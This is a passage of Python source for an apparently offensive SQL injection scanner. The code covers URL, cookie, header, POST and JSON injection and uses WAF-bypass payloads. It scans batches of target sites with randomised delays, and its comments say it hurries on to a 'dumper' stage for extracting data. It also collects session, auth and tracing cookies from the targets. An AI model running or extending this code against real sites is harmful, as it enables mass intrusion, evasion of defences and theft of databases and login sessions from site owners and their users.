        # ORDER BY params are typically named sort, order, orderby, sortby, dir, column
        order_names = {"sort", "order", "orderby", "sortby", "order_by", "sort_by",
                       "dir", "direction", "column", "col", "field", "sortfield"}
        if param_name.lower() not in order_names:
            return None
        
        for payload in self.ORDER_BY_PAYLOADS:
            test_params = params.copy()
            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
            test_params[param_name] = [str(original) + payload]
            test_url = self._build_url(base, test_params)
            
            body, _ = await self._fetch(test_url, session)
            if not body:
                continue
            
            dbms = self._detect_dbms(body)
            if dbms:
                result = SQLiResult(
                    url=url,
                    parameter=param_name,
                    vulnerable=True,
                    injection_type="error",
                    dbms=dbms,
                    technique="ORDER BY clause injection",
                    payload_used=payload,
                    confidence=0.80,
                )
                logger.info(f"ORDER BY injection found: {url} param={param_name}")
                return result
        
        return None

    async def scan(self, url: str, session: aiohttp.ClientSession = None,
                   waf_name: str = None, protection_info=None) -> List[SQLiResult]:
        """Full SQL injection scan of a URL.
        
        Tests all parameters with smart ordering, then cookie/header/POST injection.
        Uses WAF-specific bypass payloads when WAF is detected.
        Detects technology to prioritize DBMS-specific payloads.
        
        Args:
            url: Target URL with parameters
            session: Optional aiohttp session
            waf_name: Optional detected WAF name for bypass payloads
            protection_info: Optional ProtectionInfo from WAF detector
            
        Returns:
            List of SQLiResult for each finding
        """
        results = []
        own_session = False
        
        try:
            if session is None:
                session = aiohttp.ClientSession(
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    headers={"User-Agent": self.user_agent}
                )
                own_session = True
            
            # Detect technology from URL/headers for DBMS prioritization
            techs = self._detect_technology(url)
            likely_dbms = self._get_likely_dbms(techs)
            
            # Extract CMS from protection info
            if protection_info:
                if hasattr(protection_info, 'cms') and protection_info.cms:
                    cms_lower = protection_info.cms.lower()
                    if cms_lower in self.TECH_DBMS_MAP:
                        likely_dbms = self._get_likely_dbms([cms_lower])
                if hasattr(protection_info, 'waf') and protection_info.waf:
                    waf_name = protection_info.waf
            
            base, params = self._parse_url(url)
            
            # ═══ 1. URL Parameter Injection (smart-ordered) ═══
            if params:
                ordered_params = self._prioritize_params(params)
                logger.info(f"Testing {len(ordered_params)} params (ordered): {ordered_params}")
                
                for param_name in ordered_params:
                    logger.info(f"Testing parameter '{param_name}' in {url}")
                    
                    # Heuristic check — test only this specific parameter
                    injectable, dbms, _ = await self.test_heuristic(url, session, target_param=param_name)
                    if not injectable:
                        continue
                    
                    if not dbms:
                        dbms = likely_dbms[0] if likely_dbms else "mysql"
                    
                    # Error-based test (with WAF bypass if needed)
                    error_result = await self.test_error_based(url, param_name, dbms, session)
                    if error_result:
                        results.append(error_result)
                        break  # Got confirmed SQLi — save time for dumper
                    
                    # Union-based test
                    union_result = await self.test_union_based(url, param_name, dbms, session)
                    if union_result:
                        results.append(union_result)
                        break  # Got confirmed SQLi — save time for dumper
                    
                    # Boolean-based test
                    boolean_result = await self.test_boolean_based(url, param_name, session)
                    if boolean_result:
                        results.append(boolean_result)
                        break  # Got confirmed SQLi — save time for dumper
                    
                    # Time-based test (last resort)
                    time_result = await self.test_time_based(url, param_name, session)
                    if time_result:
                        results.append(time_result)
                        break  # Got confirmed SQLi — save time for dumper
                    
                    # Stacked query test (MSSQL/PostgreSQL)
                    stacked_result = await self.test_stacked_queries(url, param_name, session)
                    if stacked_result:
                        results.append(stacked_result)
                        break  # Got confirmed SQLi — save time for dumper
                    
                    # ORDER BY clause injection (for sort/order params)
                    orderby_result = await self.test_order_by_injection(url, param_name, session)
                    if orderby_result:
                        results.append(orderby_result)
            
            # If URL param injection already confirmed, skip slower injection points
            # — the dumper needs those seconds more than we need cookie/header SQLi
            if results:
                logger.info(f"SQLi confirmed via URL params — skipping cookie/header/POST/JSON injection for {url[:60]}")
                return results
            
            # ═══ 2. Cookie Injection ═══
            cookie_results = await self.test_cookie_injection(url, session, waf_name)
            results.extend(cookie_results)
            
            # ═══ 3. Header Injection ═══
            header_results = await self.test_header_injection(url, session, waf_name)
            results.extend(header_results)
            
            # ═══ 4. POST Parameter Discovery & Injection ═══
            forms = await self.discover_post_params(url, session)
            for form in forms:
                post_results = await self.test_post_injection(form, session, waf_name)
                results.extend(post_results)
            
            # ═══ 5. JSON Body Injection ═══
            json_results = await self.test_json_body_injection(url, session, waf_name)
            results.extend(json_results)
        
        except Exception as e:
            logger.error(f"Scan error for {url}: {e}")
        finally:
            if own_session and session:
                await session.close()
        
        return results

    async def batch_scan(self, urls: List[str], waf_name: str = None) -> List[SQLiResult]:
        """Scan multiple URLs for SQL injection with all injection points.
        
        Args:
            urls: List of target URLs
            waf_name: Optional WAF name for bypass payloads
            
        Returns:
            Combined list of all SQLi findings
        """
        all_results = []
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers={"User-Agent": self.user_agent}
        ) as session:
            for url in urls:
                try:
                    results = await self.scan(url, session, waf_name=waf_name)
                    all_results.extend(results)
                    
                    # Small delay between targets
                    await asyncio.sleep(random.uniform(0.5, 1.5))
                except Exception as e:
                    logger.error(f"Batch scan error for {url}: {e}")
        
        return all_results

    def get_all_cookies(self) -> List[CookieJar]:
        """Return all collected cookie jars from scanned targets."""
        return self.collected_cookies

    def get_b3_cookies(self) -> List[Dict]:
        """Return all collected b3 tracing cookies/headers from all targets."""
        b3_list = []
        for jar in self.collected_cookies:
            if jar.b3_cookies:
                b3_list.append({
                    "url": jar.url,
                    "b3": jar.b3_cookies,
                    "session_cookies": jar.session_cookies,
                })
            # Also check regular cookies for b3-like names
            for name, value in jar.cookies.items():
                if any(b3 in name.lower() for b3 in ["b3", "trace", "span"]):
                    if not jar.b3_cookies:  # Don't double-add
                        b3_list.append({
                            "url": jar.url,
                            "b3": {name: value},
                            "session_cookies": jar.session_cookies,
                        })
                        break
        return b3_list

    def get_session_cookies(self) -> List[Dict]:
        """Return all collected session/auth cookies from all targets."""
        cookie_list = []
        for jar in self.collected_cookies:
            if jar.session_cookies or jar.auth_cookies:
                cookie_list.append({
                    "url": jar.url,
                    "session": jar.session_cookies,
                    "auth": jar.auth_cookies,
                    "all": jar.cookies,
                })
        return cookie_list
